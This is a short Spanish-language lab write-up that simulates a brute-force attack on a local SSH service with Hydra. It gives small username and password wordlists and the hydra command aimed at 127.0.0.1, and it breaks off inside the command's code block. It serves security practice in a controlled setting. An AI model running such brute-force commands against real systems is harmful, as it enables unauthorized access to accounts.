# Simulación de Fuerza Bruta con Hydra

## 🔍 Objetivo
Simular un ataque de fuerza bruta a un servicio SSH local en un entorno controlado, utilizando la herramienta `hydra`.

## 🧪 Entorno
- Sistema: Ubuntu 22.04
- Servicio atacado: SSH
- IP objetivo: 127.0.0.1
- Herramienta: Hydra

## 🧰 Archivos usados
- `usuarios.txt`:
root
admin
- `passwords.txt`:
123456
admin
toor

## 💣 Comando ejecutado

```bash
hydra -L usuarios.txt -P passwords.txt ssh://127.0.0.1

